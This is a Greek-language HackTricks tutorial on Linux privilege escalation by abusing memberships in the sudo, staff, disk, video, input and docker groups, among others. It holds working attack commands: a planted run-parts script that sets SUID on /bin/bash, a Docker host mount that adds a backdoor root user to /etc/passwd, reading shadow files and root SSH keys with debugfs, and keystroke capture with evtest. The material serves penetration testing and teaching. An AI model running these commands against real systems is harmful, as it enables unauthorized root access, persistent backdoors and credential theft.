# Ενδιαφέρουσες Ομάδες - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Ομάδες Sudo/Admin

### **PE - Method 1**

**Μερικές φορές**, η πολιτική ενός συστήματος στο **/etc/sudoers** (ή σε ένα αρχείο που περιλαμβάνεται από αυτό) περιέχει καταχωρίσεις όπως:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Αυτό σημαίνει ότι οποιοσδήποτε χρήστης ταιριάζει με οποιαδήποτε από τις δύο εγγραφές μπορεί να εκτελέσει οποιαδήποτε εντολή ως οποιοσδήποτε χρήστης-στόχος μέσω του `sudo` (με την επιφύλαξη των υπόλοιπων κανόνων πολιτικής).<sup>[[3]](#references)</sup>

Αν ισχύει αυτό, για να **γίνετε root, αρκεί να εκτελέσετε**:

```
sudo su
```

Αν το `sudo -l` επιτρέπει την εκτέλεση του `adduser` με περιορισμούς και μόνο ένα όνομα χρήστη, ελέγξτε αν δημιουργείται μια ομώνυμη κύρια ομάδα που δεν υπάρχει ήδη. Ένας νέος λογαριασμός σε αυτή την ομάδα μπορεί να αποκτήσει προνόμια, αν η ισχύουσα πολιτική sudoers τα παραχωρεί ήδη στο `%group`. Επαληθεύστε τόσο τη συμπεριφορά δημιουργίας της ομάδας όσο και τον κανόνα της ομάδας πριν θεωρήσετε ότι αυτό αποτελεί διαδρομή κλιμάκωσης προνομίων. Η δημιουργία λογαριασμού αλλάζει το σύστημα, επομένως εξετάστε πρώτα την πολιτική.

### PE - Method 2

Βρείτε όλα τα suid binaries και ελέγξτε αν υπάρχει το binary **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Αν το **pkexec είναι δυαδικό αρχείο SUID**, μπορεί να εκτελέσει ένα πρόγραμμα ως άλλος χρήστης μόνο όταν το polkit εξουσιοδοτεί την αιτούμενη ενέργεια· το bit SUID από μόνο του δεν εγγυάται δικαιώματα root. Ελέγξτε την εγκατεστημένη πολιτική και την εξουσιοδότηση της στοχευόμενης συνεδρίας αντί να υποθέτετε ότι αρκεί η συμμετοχή στις ομάδες **sudo** ή **admin**.<sup>[[4]](#references)[[5]](#references)</sup>

Για τη διακριτή διαδρομή [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), επαληθεύστε πρώτα ότι το `pkexec` είναι εκτελέσιμο αρχείο **SUID που ανήκει στον root**. Ένα εγκατεστημένο δυαδικό αρχείο χωρίς αυτό το bit δεν αποτελεί την τοπική κλιμάκωση δικαιωμάτων SUID που περιγράφεται στη σχετική ανακοίνωση. Μια συμβολοσειρά έκδοσης upstream είναι απλώς ένα στοιχείο προς διερεύνηση: οι διανομές μπορούν να [ενσωματώσουν διορθώσεις σε παλαιότερες εκδόσεις πακέτων](https://ubuntu.com/security/CVE-2021-4034), γι' αυτό ελέγξτε το εγκατεστημένο πακέτο του προμηθευτή και τα μέτρα μετριασμού πριν το χαρακτηρίσετε ευάλωτο.

Το [CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) αφορά διαφορετική διαδρομή του polkit: μια συνθήκη ανταγωνισμού στην εξουσιοδότηση D-Bus, όχι ένα ελάττωμα SUID του `pkexec`. Εξετάστε το εγκατεστημένο πακέτο polkit του προμηθευτή και αν μια προσβάσιμη προνομιούχα ενέργεια D-Bus μπορεί να επιφέρει χρήσιμη αλλαγή· μια διαδρομή δημιουργίας λογαριασμού απαιτεί επίσης κατάλληλη υπηρεσία, όπως το AccountsService, ενώ η πρόσβαση sudo οποιασδήποτε νέας ομάδας εξαρτάται από την ισχύουσα πολιτική sudo. Μια αναφερόμενη έκδοση του polkit ή μια εγκατεστημένη υπηρεσία αποτελεί απλώς ένδειξη, ιδίως όταν οι προμηθευτές [ενσωματώνουν διορθώσεις](https://access.redhat.com/security/cve/cve-2021-3560). Η παθητική απαρίθμηση δεν πρέπει να ενεργοποιεί τη συνθήκη ανταγωνισμού.

Σε διανομές που εξακολουθούν να χρησιμοποιούν το παλαιότερο backend Local Authority, εξετάστε τους κανόνες ομάδων του με:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Τα σχετικά ονόματα ομάδων και οι προεπιλογές διαφέρουν ανά διανομή· μια ομάδα είναι χρήσιμη εδώ μόνο αν αναφέρεται στην τοπική πολιτική.<sup>[[5]](#references)</sup>

Για να **γίνετε root, μπορείτε να εκτελέσετε**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Αν προσπαθήσετε να εκτελέσετε το **pkexec** και εμφανιστεί αυτό το **σφάλμα**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Σε μια συνεδρία SSH χωρίς καταχωρισμένο agent αυθεντικοποίησης, το `pkexec` ενδέχεται να αποτύχει με αυτό το σφάλμα, ακόμη κι αν η πολιτική θα επέτρεπε διαφορετικά την ενέργεια· το polkit τεκμηριώνει το `pkttyagent` ως agent αυθεντικοποίησης κειμένου για συνεδρίες χωρίς περιβάλλον επιφάνειας εργασίας. Η ακριβής συμπεριφορά εξαρτάται από την έκδοση και τη διανομή, επομένως επαληθεύστε την τοπική πολιτική και τη ρύθμιση του agent. Μια λύση που έχει αναφερθεί για επηρεαζόμενες εκδόσεις του NixOS χρησιμοποιεί **2 διαφορετικές συνεδρίες SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Ένα ACL που αρνείται σε έναν λογαριασμό πρόσβαση στο `su` αφορά αυτό το εκτελέσιμο, όχι κάθε τρόπο εκτέλεσης μιας ενέργειας για την οποία έχει εξουσιοδότηση ο διαχειριστής. Αν διαρρεύσει ανεξάρτητα ένα διαπιστευτήριο διαχειριστή, εξετάστε αν η ισχύουσα πολιτική του polkit επιτρέπει μια ξεχωριστή ενέργεια, όπως την εκκίνηση μιας προσωρινής υπηρεσίας συστήματος μέσω του `systemd-run`, ποια ταυτότητα δέχεται ο agent αυθεντικοποίησης και ποια ταυτότητα θα χρησιμοποιήσει η υπηρεσία που θα προκύψει. Το [polkit διακρίνει την αυθεντικοποίηση ως κάτοχος της συνεδρίας από την αυθεντικοποίηση ως διαχειριστής](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), ενώ το [systemd-run μπορεί να ζητήσει από τον διαχειριστή συστήματος μια προσωρινή υπηρεσία](https://systemd.io/CONTROL_GROUP_INTERFACE/). Μια καταχώριση ιστορικού, μια εγκατεστημένη εντολή ή ένα αναγνώσιμο αρχείο πολιτικής δεν αποδεικνύουν από μόνα τους εξουσιοδότηση ή εγκυρότητα διαπιστευτηρίων· η παθητική εξέταση δεν πρέπει να υποβάλλει διαπιστευτήρια ή να εκκινεί μονάδα.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Ομάδα Wheel

Μερικές φορές, μια πολιτική sudoers μπορεί επίσης να περιέχει αυτήν την εγγραφή:

```
%wheel	ALL=(ALL:ALL) ALL
```

Αυτό σημαίνει ότι κάθε χρήστης που αντιστοιχεί στην εγγραφή μπορεί να εκτελέσει οποιαδήποτε εντολή ως οποιοσδήποτε χρήστης-στόχος μέσω του `sudo` (με την επιφύλαξη των υπόλοιπων κανόνων της πολιτικής).<sup>[[3]](#references)</sup>

Αν ισχύει αυτό, για να **γίνεις root, μπορείς απλώς να εκτελέσεις**:

```
sudo su
```

## Ομάδα shadow

Σε συστήματα όπου τα δικαιώματα το επιτρέπουν, οι χρήστες στην ομάδα **shadow** μπορούν να **διαβάσουν** το **/etc/shadow**· επαληθεύστε την πραγματική λειτουργία και τα ACL στο σύστημα-στόχο:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Λοιπόν, διαβάστε το αρχείο και προσπαθήστε να **crack some hashes**.

Μια σημαντική λεπτομέρεια σχετικά με την κατάσταση κλειδώματος κατά την ανάλυση των hashes:
- Οι εγγραφές με `!` ή `*` γενικά δεν επιτρέπουν διαδραστική σύνδεση με κωδικό πρόσβασης.
- Το `!hash` σημαίνει ότι ο κωδικός πρόσβασης έχει κλειδωθεί· οι υπόλοιποι χαρακτήρες αντιστοιχούν στο πεδίο κωδικού πρόσβασης όπως ήταν πριν κλειδωθεί.
- Ένα πεδίο που περιέχει `*` δεν είναι έγκυρο hash `crypt(3)` και αποτρέπει τη σύνδεση με κωδικό UNIX· μην συμπεραίνετε από αυτό αν είχε οριστεί προηγουμένως κωδικός πρόσβασης.
Αυτό είναι χρήσιμο για την ταξινόμηση λογαριασμών, ακόμα και όταν η άμεση σύνδεση είναι αποκλεισμένη.<sup>[[6]](#references)</sup>

## Ομάδα staff

**staff**: Επιτρέπει στους χρήστες να προσθέτουν τοπικές τροποποιήσεις στο σύστημα (`/usr/local`) χωρίς να χρειάζονται προνόμια root (σημειώστε ότι τα εκτελέσιμα στο `/usr/local/bin` βρίσκονται στη μεταβλητή PATH κάθε χρήστη και μπορούν να «υπερισχύουν» των εκτελέσιμων με το ίδιο όνομα στα `/bin` και `/usr/bin`). Συγκρίνετέ την με την ομάδα «adm», η οποία σχετίζεται περισσότερο με την παρακολούθηση/ασφάλεια.<sup>[[2]](#references)[[7]](#references)</sup>

Σε διαμορφώσεις Debian όπου το `/usr/local/bin` προηγείται του `/usr/bin` στο `PATH` (όπως στα παρακάτω παραδείγματα), μια εντολή χωρίς προσδιορισμένη διαδρομή εκτελεί πρώτα το αντίγραφο στο `/usr/local/bin`· επιβεβαιώστε το πραγματικό `PATH` στο σύστημα-στόχο.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Αν μια διεργασία με αυξημένα δικαιώματα επιλύει μια μη πλήρως προσδιορισμένη εντολή μέσω ενός εγγράψιμου `/usr/local/bin`, η αντικατάσταση αυτής της εντολής μπορεί να εκτελεστεί με τα δικαιώματα της διεργασίας· επιβεβαιώστε την πραγματική διαδρομή και τον τρόπο ενεργοποίησης πριν από τη δοκιμή.

Σε συστήματα Ubuntu, το `pam_motd` εκτελεί εκτελέσιμα scripts μέσω του `run-parts --lsbsysinit` ως root κατά τη σύνδεση· οι εργασίες cron μπορεί επίσης να χρησιμοποιούν το `run-parts`, αλλά αυτό εξαρτάται από τη διανομή και τη διαμόρφωση.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Σε μια νέα σύνδεση SSH, το `pspy` μπορεί να βοηθήσει να επιβεβαιωθεί αν αυτή η διαδρομή καλείται πράγματι στο target· μπορεί να παρατηρεί τις γραμμές εντολών των διεργασιών χωρίς root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Ομάδα Disk

Η συμμετοχή στην ομάδα **disk** μπορεί να παρέχει άμεση πρόσβαση σε συσκευές block και συχνά είναι **σχεδόν ισοδύναμη με πρόσβαση root**· το Debian την περιγράφει ως σε μεγάλο βαθμό ισοδύναμη με root, αλλά επαληθεύστε τα πραγματικά δικαιώματα των συσκευών και τη διάταξη αποθήκευσης στο target.<sup>[[7]](#references)</sup>

Οι συνήθεις διαδρομές συσκευών περιλαμβάνουν το `/dev/sd*`, αλλά οι διατάξεις NVMe και άλλων συστημάτων αποθήκευσης χρησιμοποιούν διαφορετικά ονόματα.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

Το `debugfs` λειτουργεί σε συστήματα αρχείων ext2/ext3/ext4· διαδρομές όπως `/root` και `/etc/shadow` παραπάνω είναι αρχεία μέσα στο ανοιγμένο σύστημα αρχείων, ενώ το δεύτερο όρισμα του `dump` είναι μια διαδρομή εξόδου στο εγγενές σύστημα αρχείων.<sup>[[8]](#references)</sup> Για παράδειγμα, αυτό εξάγει το `/tmp/asd1.txt` από το ανοιγμένο σύστημα αρχείων στο `/tmp/asd2.txt` στο εγγενές σύστημα αρχείων:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Η επιλογή `-w` ανοίγει το filesystem με δικαιώματα ανάγνωσης και εγγραφής, ενώ η εντολή `write` αντιγράφει ένα εγγενές αρχείο στο ανοιχτό filesystem. Αποφύγετε να τη χρησιμοποιείτε σε προσαρτημένο ενεργό filesystem, επειδή οι άμεσες τροποποιήσεις μπορεί να καταστρέψουν το filesystem· όταν είναι δυνατό, εργαστείτε από ένα offline image.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Ομάδα Video

Χρησιμοποιώντας την εντολή `w`, μπορείτε να δείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανιστεί έξοδος όπως η ακόλουθη.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Η καταχώριση **tty1** αντιστοιχεί στην πρώτη εικονική κονσόλα Linux· από μόνη της δεν αποδεικνύει ότι κάποιος χρήστης βρίσκεται φυσικά μπροστά στο μηχάνημα, ιδίως σε containers ή άλλα περιβάλλοντα.<sup>[[21]](#references)</sup>

Σε συστήματα που διαθέτουν αναγνώσιμη συσκευή framebuffer, η συμμετοχή στην ομάδα **video** μπορεί να παρέχει πρόσβαση σε αυτήν τη συσκευή. Η διεπαφή Linux framebuffer περιγράφει το `/dev/fb0` ως αναγνώσιμη συσκευή μνήμης, τα περιεχόμενα της οποίας μπορούν να αντιγραφούν για τη λήψη στιγμιότυπου οθόνης· η διαδρομή `/sys/class/graphics/fb0/virtual_size` είναι διαθέσιμη μόνο όπου υπάρχει αυτό το χαρακτηριστικό fbdev sysfs, οπότε ελέγξτε πρώτα το σύστημα-στόχο.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Αν η εγκατεστημένη έκδοση του **GIMP** διαθέτει εισαγωγέα raw δεδομένων, ανοίξτε το **`screen.raw`** με αυτόν· η υποστήριξη και τα διαθέσιμα στοιχεία ελέγχου διαφέρουν ανάλογα με την έκδοση και το plug-in.<sup>[[22]](#references)</sup>

![Ομάδα Disk - Ομάδα Video: Για να ανοίξετε την εικόνα raw, μπορείτε να χρησιμοποιήσετε το GIMP, να επιλέξετε το αρχείο screen.raw και ως τύπο αρχείου να επιλέξετε Raw image data](<../../../images/image (463).png>)

Ορίστε το πλάτος και το ύψος της εικόνας ώστε να ταιριάζουν με τις διαστάσεις του framebuffer· δοκιμάστε τις διαθέσιμες μορφές pixel/τύπους εικόνας μέχρι το αποτέλεσμα να είναι ευανάγνωστο.<sup>[[9]](#references)</sup>

![Ομάδα Disk - Ομάδα Video: Έπειτα, αλλάξτε το πλάτος και το ύψος στις τιμές που χρησιμοποιούνται στην οθόνη και δοκιμάστε διαφορετικούς τύπους εικόνας (επιλέξτε εκείνον που εμφανίζει καλύτερα την οθόνη)](<../../../images/image (317).png>)

## Ομάδα Input

Σε συστήματα όπου η ομάδα `input` έχει δικαίωμα ανάγνωσης στις συσκευές συμβάντων πληκτρολογίου, ένα μέλος της μπορεί να παρακολουθεί τα ακατέργαστα πλήκτρα που καταγράφονται από τη συσκευή. Ελέγξτε πρώτα τα πραγματικά δικαιώματα και τις ACL: μια ενεργή τοπική συνεδρία μπορεί να παρέχει πρόσβαση μέσω μιας ACL `uaccess`, ενώ το όνομα της ομάδας από μόνο του δεν εγγυάται πρόσβαση.<sup>[[23]](#references)[[24]](#references)</sup>

Εντοπίστε το πρόγραμμα χειρισμού `eventX` του πληκτρολογίου, επιβεβαιώστε ότι ο τρέχων λογαριασμός μπορεί να διαβάσει τον αντίστοιχο κόμβο και, στη συνέχεια, παρακολουθήστε μια σύντομη εξουσιοδοτημένη δοκιμή με το `evtest`. **Μην** χρησιμοποιήσετε το `--grab`: αποκτά αποκλειστική πρόσβαση και μπορεί να εμποδίσει άλλες εφαρμογές να λαμβάνουν είσοδο.<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` αναφέρει κωδικούς πλήκτρων και όχι ολοκληρωμένο κείμενο: η τιμή `1` σημαίνει πάτημα, η `0` απελευθέρωση και η `2` επανάληψη. Αυτό μπορεί να αποκαλύψει πλήκτρα που πληκτρολογήθηκαν σε άλλη συνεδρία με το ίδιο φυσικό πληκτρολόγιο, συμπεριλαμβανομένων διαπιστευτηρίων, αλλά από μόνο του δεν παρέχει πρόσβαση root. Ένας compositor επιφάνειας εργασίας δεν αναιρεί την πρόσβαση στον ακατέργαστο κόμβο συσκευής.<sup>[[25]](#references)</sup>

Για τους ευρύτερους ελέγχους ταυτότητας και συνεδριών, δείτε [χρήστες και συνεδρίες](../user-and-session-triage.md).

## Ομάδα root

Η συμμετοχή στην ομάδα **root** δεν παρέχει το UID του root, αλλά τα αρχεία με δικαίωμα εγγραφής από την ομάδα και ιδιοκτήτη το `root` μπορεί να είναι ενδιαφέροντα όταν καταναλώνονται από προνομιούχες υπηρεσίες ή βιβλιοθήκες. Επαληθεύστε τα πραγματικά δικαιώματα του αρχείου και τον τρόπο χρήσης του προτού το θεωρήσετε διαδρομή για privilege escalation.

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη της ομάδας root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

Η συμμετοχή στην ομάδα `docker` παρέχει πρόσβαση επιπέδου root στο Docker daemon σε τυπικές rootful εγκαταστάσεις. Επειδή τα bind mounts είναι read-write από προεπιλογή, ένας χρήστης που μπορεί να ελέγχει αυτό το daemon μπορεί να προσαρτήσει το `/` του host σε ένα container και να τροποποιήσει αρχεία του host· αυτό ουσιαστικά παρέχει root στον host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Η συμμετοχή στην ομάδα ενδέχεται να μην είναι συγχρονισμένη μεταξύ των `/etc/group`, `/etc/gshadow` και του τρέχοντος token διεργασίας. Αν ένας χρήστης απουσιάζει από το `id -nG`, αλλά το `newgrp docker` πετυχαίνει, ελέγξτε την ομάδα που εμφανίζει το `id` στο νέο shell και δοκιμάστε αν το Docker socket είναι όντως εγγράψιμο και εξυπηρετεί rootful daemon. Το όνομα της ομάδας από μόνο του δεν αποδεικνύει έλεγχο του host. Περιορίστε χρονικά κάθε αυτοματοποιημένο probe `newgrp`, ώστε ένα prompt κωδικού πρόσβασης να μην καθυστερήσει την απαρίθμηση.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Τέλος, αν δεν σου αρέσει κάποια από τις προηγούμενες προτάσεις ή δεν λειτουργούν για κάποιον λόγο (π.χ. firewall στο Docker API), μπορείς πάντα να δοκιμάσεις να **εκκινήσεις ένα privileged container και να κάνεις escape από αυτό**, όπως εξηγείται εδώ:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Αν έχεις δικαιώματα εγγραφής στο Docker socket, διάβασε [**αυτή την ανάρτηση σχετικά με την κλιμάκωση προνομίων μέσω κατάχρησης του Docker socket**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Ομάδα lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Ομάδα Adm

Συνήθως, τα **μέλη** της ομάδας **`adm`** έχουν δικαιώματα **ανάγνωσης** στα αρχεία καταγραφής που βρίσκονται στο _/var/log/_.\
Επομένως, αν έχεις παραβιάσει λογαριασμό χρήστη που ανήκει σε αυτή την ομάδα, πρέπει οπωσδήποτε να **ελέγξεις τα αρχεία καταγραφής**.<sup>[[7]](#references)</sup>

## Ομάδες Backup / Operator / lp / Mail

Αυτές οι ομάδες έχουν σημασίες που εξαρτώνται από την υπηρεσία και τη διανομή. Το Debian τεκμηριώνει την ομάδα `backup` για ανάθεση εργασιών δημιουργίας και επαναφοράς αντιγράφων ασφαλείας, την `lp` για τους δαίμονες εκτυπωτών και τη `mail` για το `/var/mail`. Επομένως, έλεγξε τα τοπικά δικαιώματα πριν θεωρήσεις ότι η συμμετοχή σε κάποια ομάδα αποτελεί οδό κλιμάκωσης προνομίων.<sup>[[7]](#references)</sup>

Συχνά αποτελούν διανύσματα **ανακάλυψης διαπιστευτηρίων** και όχι άμεσες οδούς προς root:
- **backup**: μπορεί να εκθέτει αρχεία αρχειοθέτησης με configs, κλειδιά, dumps βάσεων δεδομένων ή tokens.
- **operator**: πρόσβαση λειτουργιών ειδική για την πλατφόρμα, η οποία μπορεί να διαρρεύσει ευαίσθητα δεδομένα κατά τον χρόνο εκτέλεσης.
- **lp**: οι ουρές και τα spool εκτυπώσεων μπορεί να περιέχουν το περιεχόμενο εγγράφων.
- **mail**: τα spool αλληλογραφίας μπορεί να εκθέτουν συνδέσμους επαναφοράς, OTP και εσωτερικά διαπιστευτήρια.

Αντιμετώπισε τη συμμετοχή σε αυτές τις ομάδες ως εύρημα έκθεσης δεδομένων υψηλής αξίας και συνέχισε την έρευνα ελέγχοντας αν επαναχρησιμοποιούνται κωδικοί πρόσβασης ή tokens.

## Ομάδα Auth

Στο OpenBSD, όταν έχει ρυθμιστεί το S/Key, το `/etc/skey` ανήκει στον `root:auth` και για πρόσβαση στις εγγραφές του απαιτείται η ομάδα `auth`. Οι εγγραφές YubiKey αποθηκεύονται στο `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Μια ευάλωτη ρύθμιση του OpenBSD 6.6 με ενεργοποιημένο το S/Key ή το YubiKey επέτρεπε σε τοπικούς χρήστες με προνόμια `auth` να γίνουν root· η Qualys τεκμηριώνει τις προϋποθέσεις και την αλυσίδα εκμετάλλευσης, ενώ το συνδεδεμένο PoC την υλοποιεί.<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [Έλεγχος ταυτότητας pkexec/pkttyagent χωρίς συνεδρία GUI (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Εγχειρίδιο αναφοράς polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Εγχειρίδιο αναφοράς polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Εγχειρίδιο ασφάλισης του Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Σελίδα εγχειριδίου Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Η συσκευή Frame Buffer — Τεκμηρίωση του Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — Παρακολούθηση διεργασιών Linux χωρίς προνόμια](https://github.com/DominicBreuker/pspy)
- [13] [Ασφάλεια του Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Διαχείριση του Docker ως χρήστης χωρίς δικαιώματα root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Εκτέλεση containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Σελίδες εγχειριδίου OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Σελίδες εγχειριδίου OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Ευπάθειες ελέγχου ταυτότητας στο OpenBSD — Συμβουλευτική ανακοίνωση ασφαλείας της Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC τοπικής εκμετάλλευσης](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Εκχωρημένες συσκευές Linux (έκδοση 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Εισαγωγή και εξαγωγή εικόνων — Τεκμηρίωση GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [Οδηγίες δικαιωμάτων συσκευής beep — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — Εγχειρίδιο systemd](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Κωδικοί συμβάντων εισόδου — Τεκμηρίωση Linux kernel](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — Debian Manpages](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
